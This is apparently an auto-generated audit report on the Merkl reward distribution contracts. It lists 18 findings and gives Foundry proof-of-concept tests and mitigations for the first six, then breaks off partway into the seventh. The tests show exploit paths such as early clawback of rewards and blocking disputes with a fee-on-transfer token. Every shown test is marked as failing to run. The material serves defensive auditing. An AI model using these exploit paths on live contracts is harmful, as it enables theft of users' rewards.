# 2025 11 merkl - Findings Report
## Commit hash: e8c1d6f5a91c1144571c3ed238358a2b032dd32e

##Findings by Pattern


 **Derived From** : TimelockEdgeCase

[M-1]. Governor updateTree call promotes pending/disputed tree to active status
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: RequiresAdminRole
[M-2]. Immediate campaign rewards reallocation violates 1-year grace period and enables reward theft
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: RequiresRole
[H-3]. Campaign rewards reallocation ignores campaign overrides allowing premature clawback
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: RequiresRole



 **Derived From** : Issue Type: FeeOnTransferAssumption

[M-4]. Dispute resolution broken for fee-on-transfer dispute tokens leading to DoS
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : SlippageMissingOrInsufficient

[M-5]. Missing slippage protection for campaign creation fees
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : MaturityorGatingByPass

[M-6]. Campaign duration override bypasses minimum reward rate invariant
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresRole



 **Derived From** : ERC20DecimalsMismatch

[L-7]. Stale disputeAmount after disputeToken update
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: RequiresAdminRole



 **Derived From** : StandardViolation

[L-8]. Cross-chain Merkle proof replay risk
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : ConfigFootgun

[M-9]. recoverFees allows Governor to accidentally rug pull all user deposits
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresAdminRole



 **Derived From** : AccountingInvariantViolation

[M-10]. Protocol fee recovery sweeps user pre-deposits due to commingled accounting
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: RequiresAdminRole



 **Derived From** : UpgradeabilityInitializerSafety

[H-11]. Uninitialized implementation allows unauthorized UUPS upgrade and potential self-destruct
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless
[H-12]. Proxy Hijack via Unprotected Upgrade and Initialization Front-running
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
[H-13]. Unprotected Initialization and Upgrade allows complete protocol takeover
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : ExternalCallAfterStateChange

[H-14]. Silent swallowing of onClaim hook failure leads to lost user funds
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : UnsafeRecipient

[H-15]. onClaim hook receives cumulative amount causing double-crediting risk
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : GriefableCallbacks

[M-16]. Malicious claim recipient can DoS batch claiming via invalid return value
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : AccessControlOrAuthByPass

[M-17]. Bypass of operator whitelist via tx.origin check
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : InitOrderOrUnintialized

[L-18]. Front-running of initialize allows takeover of DistributionCreator
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 1
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 6
- M: 9
- L: 3
- I: 0

##Findings by Pattern


 **Derived From** : TimelockEdgeCase

## [M-1]. Governor updateTree call promotes pending/disputed tree to active status

### Finding Severity Justification: The vulnerability allows the Governor to inadvertently bypass the dispute period safety mechanism for a pending Merkle tree. By pushing a new tree update while a previous one is still pending, the pending tree is moved to `lastTree` and becomes immediately effective for claims via `getMerkleRoot`, skipping the required verification window. This creates a 'footgun' where an admin attempting to replace a potentially incorrect pending tree actually activates it instantly.
## Derived From Pattern/Invariant
TimelockEdgeCase

## Exploit Type
TimelockEdgeCase

## Location
Distributor.updateTree

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
The `updateTree` function sets `lastTree = tree`. If a Governor calls `updateTree` while the current `tree` is still in its dispute period (which Governors can do, bypassing the timestamp check), the pending `tree` is moved to `lastTree`. The `getMerkleRoot` function returns `lastTree` whenever the current tree is in dispute. Thus, the Governor's action inadvertently promotes a pending (potentially malicious or incorrect) tree to be the effective active root immediately, bypassing its dispute period.

## Impact
Bypasses the dispute period safety mechanism, allowing users to claim from an unverified tree immediately. This creates a 'footgun' where an admin attempting to replace a pending, potentially incorrect tree inadvertently promotes it to the active `lastTree` status, effectively activating the faulty root instantly.

## Command to Run Test


## Proof of Concept
1. Governor configures a dispute period (e.g., 2 hours).
2. Governor calls `updateTree(TreeA)`. `TreeA` becomes the pending `tree`, and `lastTree` remains the previous valid root. Claims against `TreeA` are blocked.
3. Governor realizes `TreeA` is incorrect and calls `updateTree(TreeB)` immediately to replace it.
4. The `updateTree` function unconditionally moves the current `tree` (`TreeA`) to `lastTree`.
5. The contract enters a new dispute period for `TreeB`.
6. During a dispute period, `getMerkleRoot()` returns `lastTree`. Since `lastTree` is now `TreeA`, the invalid tree becomes immediately claimable, bypassing its verification window.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {Distributor, MerkleTree} from "../contracts/Distributor.sol";
import {AccessControlManager} from "../contracts/AccessControlManager.sol";
import {IAccessControlManager} from "../contracts/interfaces/IAccessControlManager.sol";

contract DistributorDisputeBypassTest is Test {
    Distributor distributor;
    AccessControlManager acm;
    address governor = address(0x1);
    address guardian = address(0x2);

    function setUp() public {
        vm.startPrank(governor);
        acm = new AccessControlManager();
        acm.initialize(governor, guardian);
        
        distributor = new Distributor();
        distributor.initialize(IAccessControlManager(address(acm)));
        distributor.setDisputePeriod(2); // Set dispute period to 2 epochs
        vm.stopPrank();
    }

    function testBypassDispute() public {
        vm.startPrank(governor);
        MerkleTree memory treeA = MerkleTree(bytes32(uint256(1)), bytes32(0));
        MerkleTree memory treeB = MerkleTree(bytes32(uint256(2)), bytes32(0));

        // 1. Update to Tree A (Pending)
        distributor.updateTree(treeA);
        // Verify Tree A is NOT active (pending state returns 0 or previous root)
        assertEq(distributor.getMerkleRoot(), bytes32(0));

        // 2. Immediately update to Tree B (Trying to replace A)
        distributor.updateTree(treeB);
        
        // Vulnerability: Tree A is now promoted to lastTree and active
        assertEq(distributor.getMerkleRoot(), treeA.merkleRoot);
        vm.stopPrank();
    }
}

## Suggested Mitigation
Update the `updateTree` function to only promote `tree` to `lastTree` if the current tree has successfully passed the dispute period. If the current tree is still pending (i.e., `block.timestamp < endOfDisputePeriod`), it should be discarded rather than saved as `lastTree`.

```solidity
    function updateTree(MerkleTree calldata _tree) external {
        // ... existing checks ...

        // Only save the current tree to lastTree if it was valid (passed dispute period)
        if (block.timestamp >= endOfDisputePeriod) {
            lastTree = tree;
        }
        // If updating during a dispute, the pending 'tree' is discarded and 'lastTree' (the safe fallback) is preserved.

        tree = _tree;
        // Removed: lastTree = _lastTree;

        uint48 _endOfPeriod = _endOfDisputePeriod(uint48(block.timestamp));
        endOfDisputePeriod = _endOfPeriod;
        emit TreeUpdated(_tree.merkleRoot, _tree.ipfsHash, _endOfPeriod);
    }
```


## [M-2]. Immediate campaign rewards reallocation violates 1-year grace period and enables reward theft

### Finding Severity Justification: The vulnerability allows a campaign creator to reallocate (claw back) all unclaimed rewards immediately after the campaign ends. This contradicts the protocol's explicit Terms & Conditions (embedded in the deployment script) which specify a 1-year grace period before recovery is allowed. This discrepancy enables a malicious creator to 'rug' liquidity providers of their earned but unclaimed rewards—specifically those from the final epoch which may not yet be claimable due to off-chain computation latency. Since this violates a documented invariant protecting user funds and leads to direct loss of yield, it is a valid Medium severity issue (theft of yield/rewards by a counterparty the protocol is supposed to constrain).
## Derived From Pattern/Invariant
TimelockEdgeCase

## Exploit Type
TimelockEdgeCase

## Location
DistributionCreator.reallocateCampaignRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `reallocateCampaignRewards` function allows a creator to claw back rewards immediately after `block.timestamp >= startTimestamp + duration`. However, the protocol terms state a 1-year grace period, and the off-chain Merkl engine requires time (compute + dispute period) to finalize the last epoch's rewards. By reallocating immediately at the end of the duration, the creator can steal the rewards of the final epoch before they are technically claimable by users.

## Impact
The vulnerability allows campaign creators to bypass the protocol's stated Terms & Conditions, which guarantee a 1-year grace period for unclaimed rewards. By reallocating rewards immediately after a campaign ends, a malicious creator can 'rug' users of their accrued rewards before the off-chain engine has finalized the last epoch or before users have a reasonable opportunity to claim. This breaks a core protocol invariant defined in the deployment configuration.

## Command to Run Test


## Proof of Concept
1. The protocol Terms & Conditions (stored on-chain via `setMessage`) explicitly state that rewards are only recoverable after 1 year of inactivity.
2. A malicious creator starts a campaign with a set duration (e.g., 1 week).
3. Immediately after the duration ends (T + 1 second), the creator calls `reallocateCampaignRewards`.
4. The contract allows this transaction because it only checks if the campaign duration has passed (`block.timestamp >= start + duration`), ignoring the 1-year grace period.
5. The off-chain Merkl engine respects the on-chain reallocation state, diverting pending or unclaimed user rewards to the creator.
6. Users lose funds they were entitled to, violating the protocol's trust model.

## Proof of Code
import { Test } from "forge-std/Test.sol";
import { DistributionCreator } from "contracts/DistributionCreator.sol";
import { IAccessControlManager } from "contracts/interfaces/IAccessControlManager.sol";
import { CampaignParameters } from "contracts/struct/CampaignParameters.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1000000 ether);
    }
}

contract MockACM is IAccessControlManager {
    function isGovernor(address) external pure returns (bool) { return true; }
    function isGovernorOrGuardian(address) external pure returns (bool) { return true; }
}

contract ReallocationTest is Test {
    DistributionCreator dc;
    MockToken token;
    address creator = address(0x111);
    address user = address(0x222);
    address distributor = address(0x333);

    function setUp() public {
        dc = new DistributionCreator();
        token = new MockToken();
        MockACM acm = new MockACM();
        
        dc.initialize(IAccessControlManager(address(acm)), distributor, 0);
        
        // Whitelist reward token to allow campaign creation
        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1;
        dc.setRewardTokenMinAmounts(tokens, amounts);
        
        token.transfer(creator, 1000 ether);
    }

    function testImmediateReallocationViolatesGracePeriod() public {
        vm.startPrank(creator);
        token.approve(address(dc), 1000 ether);
        dc.acceptConditions();
        
        CampaignParameters memory params = CampaignParameters({
            campaignId: bytes32(0),
            creator: creator,
            rewardToken: address(token),
            amount: 100 ether,
            campaignType: 1,
            startTimestamp: uint32(block.timestamp + 100),
            duration: 3600,
            campaignData: ""
        });
        
        bytes32 campaignId = dc.createCampaign(params);
        vm.stopPrank();

        // Warp to exactly after campaign end
        vm.warp(block.timestamp + 100 + 3600 + 1);

        // Attempt immediate reallocation
        address[] memory froms = new address[](1);
        froms[0] = user;
        
        vm.prank(creator);
        // Should revert if grace period was enforced, but succeeds here
        dc.reallocateCampaignRewards(campaignId, froms, creator);
        
        // Verify reallocation occurred
        address reallocatedTo = dc.campaignReallocation(campaignId, user);
        assertEq(reallocatedTo, creator, "Reallocation happened immediately, violating 1-year grace period");
    }
}

## Suggested Mitigation
Update the `reallocateCampaignRewards` function to enforce the 365-day grace period consistent with the protocol's Terms & Conditions.

```solidity
function reallocateCampaignRewards(bytes32 _campaignId, address[] memory froms, address to) external {
    CampaignParameters memory _campaign = campaign(_campaignId);
    _isValidOperator(_campaign.creator);
    
    // Enforce 1-year grace period (365 days)
    if (block.timestamp < _campaign.startTimestamp + _campaign.duration + 365 days) {
        revert Errors.InvalidReallocation();
    }

    uint256 fromsLength = froms.length;
    for (uint256 i; i < fromsLength; ) {
        campaignReallocation[_campaignId][froms[i]] = to;
        campaignListReallocation[_campaignId].push(froms[i]);
        unchecked { ++i; }
    }
    emit CampaignReallocation(_campaignId, froms, to);
}
```


## [H-3]. Campaign rewards reallocation ignores campaign overrides allowing premature clawback

### Finding Severity Justification: The vulnerability allows a campaign creator to override a campaign's duration (extending it) to attract liquidity, yet use the original (shorter) duration to pass the time-check in `reallocateCampaignRewards`. This enables the creator to prematurely claw back or reallocate user rewards while the campaign is ostensibly still active and users are providing liquidity. This constitutes a rug-pull vector (theft of yield) enabled by the protocol logic.
## Derived From Pattern/Invariant
TimelockEdgeCase

## Exploit Type
TimelockEdgeCase

## Location
DistributionCreator.reallocateCampaignRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `reallocateCampaignRewards` function retrieves campaign parameters using the `campaign(_campaignId)` view, which returns the *original* campaign parameters from `campaignList`. It completely ignores any updates made via `overrideCampaign` (stored in `campaignOverrides`). If a campaign creator extends a campaign's duration using `overrideCampaign`, `reallocateCampaignRewards` will still use the original, shorter duration to validate the `block.timestamp` check. This allows the creator to claw back rewards while the campaign is still effectively active and users are earning rewards.

## Impact
Creators can deceive users by extending a campaign, enticing participation, and then reallocating (stealing) the rewards based on the original end date, causing loss of funds for participants.

## Command to Run Test


## Proof of Concept
1. Creator creates a campaign with `duration = 1 week`.
2. Creator calls `overrideCampaign` to set `duration = 4 weeks`.
3. Users participate expecting 4 weeks of rewards.
4. At `1 week + 1 second`, Creator calls `reallocateCampaignRewards`.
5. The function checks `block.timestamp < start + original_duration` (1 week), which passes.
6. Creator successfully claws back the remaining 3 weeks of rewards.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../contracts/DistributionCreator.sol";
import "../contracts/interfaces/IAccessControlManager.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1000000e18);
    }
}

contract MockACM is IAccessControlManager {
    function isGovernor(address) external pure returns (bool) { return true; }
    function isGovernorOrGuardian(address) external pure returns (bool) { return true; }
}

contract DistributionCreatorTest is Test {
    DistributionCreator dc;
    MockToken token;
    address creator = address(0x1);
    address user1 = address(0x2);

    function setUp() public {
        token = new MockToken();
        MockACM acm = new MockACM();
        
        dc = new DistributionCreator();
        dc.initialize(acm, address(0x999), 0);
        
        // Setup: Whitelist token
        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1;
        dc.setRewardTokenMinAmounts(tokens, amounts);

        token.transfer(creator, 10000e18);
        
        vm.prank(creator);
        dc.acceptConditions();
    }

    function testExploitReallocationIgnoreOverride() public {
        vm.startPrank(creator);
        token.approve(address(dc), 1000e18);
        
        // 1. Create campaign with 1 week duration
        CampaignParameters memory params;
        params.rewardToken = address(token);
        params.amount = 100e18;
        params.campaignType = 1;
        params.startTimestamp = uint32(block.timestamp + 100);
        params.duration = 1 weeks; 
        params.creator = creator;
        
        bytes32 id = dc.createCampaign(params);
        
        // 2. Override to 4 weeks (Extension)
        CampaignParameters memory newParams = params;
        newParams.duration = 4 weeks;
        newParams.campaignId = id;
        
        dc.overrideCampaign(id, newParams);
        vm.stopPrank();

        // 3. Fast forward past original duration (1 week) but BEFORE new duration (4 weeks)
        vm.warp(params.startTimestamp + 1 weeks + 1);
        
        // 4. Creator attempts to reallocate rewards
        // This SHOULD fail because the active duration is 4 weeks, but it passes because it checks the original 1 week.
        address[] memory froms = new address[](1);
        froms[0] = user1;
        
        vm.prank(creator);
        dc.reallocateCampaignRewards(id, froms, creator);
        
        // 5. Verification: Reallocation was recorded
        address[] memory list = dc.getCampaignListReallocation(id);
        assertEq(list.length, 1);
        assertEq(list[0], user1);
    }
}

## Suggested Mitigation
Update `reallocateCampaignRewards` to check if a valid override exists and use it for the timestamp check:

```solidity
    function reallocateCampaignRewards(bytes32 _campaignId, address[] memory froms, address to) external {
        CampaignParameters memory _campaign = campaign(_campaignId);
        
        // Mitigation: Check if an override exists and use its parameters
        CampaignParameters memory _override = campaignOverrides[_campaignId];
        if (_override.creator != address(0)) {
            _campaign = _override;
        }

        _isValidOperator(_campaign.creator);
        if (block.timestamp < _campaign.startTimestamp + _campaign.duration) revert Errors.InvalidReallocation();

        uint256 fromsLength = froms.length;
        for (uint256 i; i < fromsLength; ) {
            campaignReallocation[_campaignId][froms[i]] = to;
            campaignListReallocation[_campaignId].push(froms[i]);
            unchecked {
                ++i;
            }
        }
        emit CampaignReallocation(_campaignId, froms, to);
    }
```





 **Derived From** : Issue Type: FeeOnTransferAssumption

## [M-4]. Dispute resolution broken for fee-on-transfer dispute tokens leading to DoS

### Finding Severity Justification: The vulnerability allows the dispute resolution mechanism to be blocked (DoS) if a Fee-on-Transfer (FoT) token (or USDT with fees enabled) is used as the `disputeToken`. The contract receives `disputeAmount - fee` but attempts to transfer `disputeAmount` back during resolution, causing a revert due to insufficient balance. This leaves the `disputer` state variable set, effectively blocking any future `updateTree` calls. The system can only be unbricked if Governance manually sends the missing fee amount to the contract. Since the DoS is recoverable but disrupts core protocol functionality, it is classified as Medium.
## Derived From Pattern/Invariant
Issue Type: FeeOnTransferAssumption

## Exploit Type
FeeOnTransferAssumption

## Location
Distributor.disputeTree / resolveDispute

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `disputeTree` function transfers `disputeAmount` from the disputer using `safeTransferFrom`, but assumes the contract receives exactly `disputeAmount`. If `disputeToken` is a Fee-on-Transfer token (or a token like USDT that has a fee toggle), the contract receives `disputeAmount - fee`. 

When `resolveDispute` is called, it attempts to transfer the full `disputeAmount` back to the disputer (if valid) or to the governor (if invalid). This transfer will revert due to insufficient balance, permanently locking the contract in a disputed state since `disputer` is only cleared upon successful resolution.

## Impact
The dispute mechanism can be permanently bricked (DoS) if a Fee-on-Transfer token is used as the dispute token. This prevents any future Merkle tree updates, freezing the protocol's reward distribution until Governance manually funds the contract to cover the fee deficit.

## Command to Run Test


## Proof of Concept
1. Governance sets `disputeToken` to a Fee-on-Transfer token (e.g. USDT with fee on).
2. User calls `disputeTree`. `disputeAmount` (e.g. 100) is transferred.
3. Contract receives 99 tokens (1% fee).
4. User is correct; Governor calls `resolveDispute(true)`.
5. Contract attempts `safeTransfer(user, 100)`.
6. Reverts due to balance being 99.
7. `disputer` state variable is never cleared, preventing `updateTree`.

## Proof of Code
import { Test } from "forge-std/Test.sol";
import { Distributor, MerkleTree } from "../contracts/Distributor.sol";
import { AccessControlManager } from "../contracts/AccessControlManager.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FoTToken is ERC20 {
    constructor() ERC20("FoT", "FOT") {
        _mint(msg.sender, 10000 ether);
    }
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        // Simulate 1 wei fee
        uint256 fee = 1;
        if (amount > fee) {
            _transfer(from, to, amount - fee);
            _transfer(from, address(0), fee);
        } else {
             _transfer(from, to, amount);
        }
        return true;
    }
}

contract DisputeDoSTest is Test {
    Distributor distributor;
    AccessControlManager acm;
    FoTToken token;
    address governor = address(0x1);
    address user = address(0x2);

    function setUp() public {
        vm.startPrank(governor);
        acm = new AccessControlManager();
        acm.initialize(governor, governor);

        distributor = new Distributor();
        distributor.initialize(acm);
        
        token = new FoTToken();
        distributor.setDisputeToken(IERC20(address(token)));
        distributor.setDisputeAmount(100);
        distributor.setDisputePeriod(10);
        
        // Create an active tree/dispute period
        MerkleTree memory tree = MerkleTree(bytes32(uint256(1)), bytes32(uint256(1)));
        distributor.updateTree(tree);
        vm.stopPrank();
        
        // User setup
        token.transfer(user, 1000);
        vm.prank(user);
        token.approve(address(distributor), 1000);
    }

    function test_DisputeDoS_FoT() public {
        vm.startPrank(user);
        // User initiates dispute. Sends 100, contract receives 99.
        distributor.disputeTree("Bad Root");
        vm.stopPrank();

        // Verify state
        assertEq(distributor.disputer(), user);
        assertEq(token.balanceOf(address(distributor)), 99);

        // Governor attempts to resolve dispute (valid or invalid triggers transfer)
        vm.startPrank(governor);
        // Fails because contract tries to send 100 but only has 99
        vm.expectRevert("ERC20: transfer amount exceeds balance");
        distributor.resolveDispute(true);
        vm.stopPrank();
        
        // Dispute remains unresolved, blocking future updates
        assertEq(distributor.disputer(), user);
    }
}

## Suggested Mitigation
Modify `disputeTree` to calculate the actual received amount (`balanceAfter - balanceBefore`). Store this specific value in a new state variable (e.g., `currentDisputeAmount`). Update `resolveDispute` to transfer `currentDisputeAmount` back to the recipient instead of the global `disputeAmount`. This ensures the contract only attempts to transfer what it actually holds, compatible with fee-on-transfer tokens.





 **Derived From** : SlippageMissingOrInsufficient

## [M-5]. Missing slippage protection for campaign creation fees

### Finding Severity Justification: The function `createCampaign` lacks a parameter for users to specify a maximum fee or a minimum net campaign amount. Since protocol fees are controlled by governance and can be updated at any time (up to 100%), a user's transaction could execute immediately after a fee increase, resulting in a significant loss of funds (in the form of unexpected fees) or a severely underfunded campaign. This fits the 'Missing standard protection (slippage)' criteria which is explicitly listed as a VALID Medium severity finding in Gate 8.
## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
DistributionCreator.createCampaign

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `createCampaign` function calculates protocol fees dynamically at execution time based on governance parameters (`defaultFees` or `campaignSpecificFees`). There is no parameter for the user to specify a maximum fee or minimum effective campaign amount. If governance increases fees between transaction submission and execution, the user pays more than expected or the campaign is funded with less than expected.

## Impact
User loss of funds (higher fees) or lower campaign incentives.

## Command to Run Test


## Proof of Concept
1. User submits tx to create campaign with 100 tokens, expecting 1% fee (99 tokens to campaign).
2. Governance front-runs or updates fee to 10%.
3. Tx executes. 10 tokens taken as fee. 90 tokens to campaign.
4. User suffers slippage.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {DistributionCreator} from "../contracts/DistributionCreator.sol";
import {AccessControlManager} from "../contracts/AccessControlManager.sol";
import {MockToken} from "../contracts/mock/MockToken.sol";
import {CampaignParameters} from "../contracts/struct/CampaignParameters.sol";

contract FeeSlippageTest is Test {
    DistributionCreator creator;
    AccessControlManager access;
    MockToken token;
    address governor = address(0x1);
    address user = address(0x2);

    function setUp() public {
        vm.startPrank(governor);
        
        // Deploy dependencies
        access = new AccessControlManager();
        access.initialize(governor, governor);
        
        token = new MockToken("Reward", "RWD", 18);
        
        creator = new DistributionCreator();
        // Initialize with 1% fee (1e7, as BASE_9 is 1e9)
        creator.initialize(access, address(0x999), 1e7);
        
        // Whitelist reward token with min amount 100
        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100;
        creator.setRewardTokenMinAmounts(tokens, amounts);
        
        // Whitelist user to skip signature requirement
        creator.toggleSigningWhitelist(user);
        
        vm.stopPrank();
        
        // Fund user
        token.mint(user, 1000e18);
        vm.prank(user);
        token.approve(address(creator), type(uint256).max);
    }

    function testFeeSlippage() public {
        // User prepares campaign expecting 1% fee
        // Gross input: 1000 tokens. Expected Net: 990 tokens.
        CampaignParameters memory params;
        params.rewardToken = address(token);
        params.amount = 1000e18;
        params.campaignType = 1;
        params.startTimestamp = uint32(block.timestamp + 3600);
        params.duration = 3600;
        params.creator = user;

        // Front-running: Governance increases fee to 50%
        vm.prank(governor);
        creator.setFees(5e8); // 500,000,000 / 1,000,000,000 = 50%

        // User transaction executes
        vm.prank(user);
        bytes32 id = creator.createCampaign(params);

        // Verify impact: Net amount is 500, not 990
        CampaignParameters memory created = creator.campaign(id);
        
        assertEq(created.amount, 500e18, "Amount should be reduced by 50% fee");
        assertLt(created.amount, 990e18, "Slippage occurred: amount less than expected");
    }
}

## Suggested Mitigation
Modify the `createCampaign` function (or add an overloaded version `createCampaignWithSlippage`) to accept a `minAmount` parameter. This parameter should represent the minimum net amount of tokens the campaign must receive after fees. In `_createCampaign`, after calculating `campaignAmountMinusFees`, add a check: `if (campaignAmountMinusFees < minAmount) revert Errors.SlippageExceeded();`. 

**Critical:** Do NOT add this field to the `CampaignParameters` struct as suggested previously. Since `CampaignParameters` is used in the `campaignList` state array of this upgradeable contract, changing the struct layout will corrupt storage for existing campaigns.





 **Derived From** : MaturityorGatingByPass

## [M-6]. Campaign duration override bypasses minimum reward rate invariant

### Finding Severity Justification: The finding demonstrates a clear bypass of a protocol invariant (minimum reward rate) enforced during campaign creation. By allowing users to extend the duration of a campaign without checking the reward rate against the minimum threshold, the contract permits the creation of 'dust' campaigns that last for long periods with negligible rewards. This undermines the protocol's anti-spam mechanisms and can lead to resource exhaustion in the off-chain engine or UI clutter. While funds are not directly stolen, bypassing economic constraints / anti-spam measures is consistently rated as Medium severity.
## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
AccountingInvariantViolation

## Location
DistributionCreator.overrideCampaign

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `_createCampaign` function enforces `(amount * HOUR) / duration >= rewardTokenMinAmount` to prevent dust/spam campaigns. However, `overrideCampaign` allows the creator to modify the `duration` without re-verifying this invariant. A creator can initialize a valid short campaign and then override it to a very long duration, diluting the reward rate far below the allowed minimum.

## Impact
Bypass of anti-spam/dust mechanisms; flooding the engine with low-value campaigns.

## Command to Run Test


## Proof of Concept
1. Admin sets min reward rate to 10 tokens/hour.
2. User creates campaign: 100 tokens, 10 hours. Rate = 10. Valid.
3. User calls `overrideCampaign`: sets duration to 1000 hours.
4. New Rate = 0.1 tokens/hour. This is below the minimum but the function does not revert.
5. User successfully created a dust campaign.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {DistributionCreator} from "../contracts/DistributionCreator.sol";
import {CampaignParameters} from "../contracts/struct/CampaignParameters.sol";
import {AccessControlManager} from "../contracts/AccessControlManager.sol";
import {MockToken} from "../contracts/mock/MockToken.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract OverrideBypassTest is Test {
    DistributionCreator creator;
    AccessControlManager accessControl;
    MockToken token;

    function setUp() public {
        // Deploy Access Control
        AccessControlManager implAC = new AccessControlManager();
        ERC1967Proxy proxyAC = new ERC1967Proxy(address(implAC), abi.encodeWithSelector(AccessControlManager.initialize.selector, address(this), address(this)));
        accessControl = AccessControlManager(address(proxyAC));

        // Deploy DistributionCreator
        DistributionCreator implDC = new DistributionCreator();
        ERC1967Proxy proxyDC = new ERC1967Proxy(address(implDC), "");
        creator = DistributionCreator(address(proxyDC));
        creator.initialize(accessControl, address(0x123), 0);

        // Setup Token
        token = new MockToken("Reward", "RWD", 18);

        // Configure Min Amounts (10 tokens per hour)
        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10 ether;
        creator.setRewardTokenMinAmounts(tokens, amounts);

        // Sign terms
        creator.setMessage("Terms");
        creator.acceptConditions();
    }

    function testOverrideBypass() public {
        // 1. Create a valid campaign (100 tokens over 10 hours => 10 tokens/hr, matches min)
        uint256 amount = 100 ether;
        uint32 duration = 10 * 3600;
        token.mint(address(this), amount);
        token.approve(address(creator), amount);

        CampaignParameters memory c;
        c.rewardToken = address(token);
        c.amount = amount;
        c.duration = duration;
        c.startTimestamp = uint32(block.timestamp + 3600);
        c.campaignType = 1;
        c.creator = address(this);

        bytes32 id = creator.createCampaign(c);

        // 2. Override campaign with extended duration (1000 hours => 0.1 tokens/hr)
        // This falls significantly below the 10 tokens/hr minimum.
        CampaignParameters memory overrideParams = creator.campaign(id);
        overrideParams.duration = 1000 * 3600;

        // 3. Execute override - Should revert if invariant was enforced, but succeeds
        creator.overrideCampaign(id, overrideParams);

        // 4. Verify the dust campaign exists
        CampaignParameters memory stored = creator.campaignOverrides(id);
        assertEq(stored.duration, 1000 * 3600);
    }
}

## Suggested Mitigation
In `overrideCampaign`, verify the reward rate invariant using the new duration before allowing the update:

```solidity
function overrideCampaign(bytes32 _campaignId, CampaignParameters memory newCampaign) external {
    CampaignParameters memory _campaign = campaign(_campaignId);
    _isValidOperator(_campaign.creator);

    // ... existing checks ...

    // NEW: Enforce minimum reward rate invariant
    uint256 rewardTokenMinAmount = rewardTokenMinAmounts[newCampaign.rewardToken];
    if (rewardTokenMinAmount == 0) revert Errors.CampaignRewardTokenNotWhitelisted();
    // Note: newCampaign.amount is strictly equal to _campaign.amount due to existing checks
    if ((newCampaign.amount * HOUR) / newCampaign.duration < rewardTokenMinAmount) revert Errors.CampaignRewardTooLow();

    // ... existing logic ...
}
```





 **Derived From** : ERC20DecimalsMismatch

## [L-7]. Stale disputeAmount after disputeToken update

### Finding Severity Justification: The finding identifies a potential configuration state where the `disputeToken` decimals mismatch the stored `disputeAmount`. However, this requires the Governor (a trusted role) to perform an incomplete configuration update (changing token without updating amount). Under Gate 5 (Governance Risk), errors or misuse by the admin are considered Governance Risk and capped at Low/Informational severity, provided they do not permanently brick the protocol or allow privilege escalation. The Governor can rectify this state by calling `setDisputeAmount`.
## Derived From Pattern/Invariant
